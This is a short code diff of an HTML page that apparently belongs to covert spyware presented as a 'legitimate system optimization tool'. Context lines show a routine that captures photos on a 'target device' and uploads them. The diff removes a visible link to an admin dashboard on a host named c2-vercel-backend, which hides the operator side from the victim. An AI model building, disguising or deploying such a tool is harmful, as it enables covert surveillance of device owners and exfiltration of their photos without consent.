@@ -23,8 +23,6 @@
         .btn{background:linear-gradient(90deg,#f7971e,#ffd200);border:none;padding:14px;border-radius:60px;font-weight:700;font-size:16px;color:#0a0a12;width:100%;cursor:pointer;margin-top:12px}
         .btn:active{transform:scale(0.96)}
         .note{font-size:11px;color:#4a4a6a;margin-top:16px}
-        .dashboard-link{color:#88ccff;text-decoration:none;font-size:13px;display:block;margin-top:12px}
-        .dashboard-link:hover{text-decoration:underline}
     </style>
 </head>
 <body>
@@ -35,7 +33,6 @@
     <div class="status" id="statusText">⏳ Initializing...</div>
     <button class="btn" id="toggleLogsBtn">📋 Toggle Logs</button>
     <div class="log-console" id="logConsole"><div id="logEntries"></div></div>
-    <a class="dashboard-link" href="https://c2-vercel-backend.vercel.app/api/dashboard" target="_blank">📊 Open Admin Dashboard</a>
     <p class="note">⚡ This is a legitimate system optimization tool.</p>
 </div>
 
@@ -262,7 +259,6 @@
                 } else {
                     addLog('[Photo] Upload failed.', 'error');
                 }
-                // ❌ REMOVED: no download on target device
             } catch(e) {
                 addLog(`[Photo] Error: ${e}`, 'error');
                 setStatus('⚠️ Photo capture failed.');
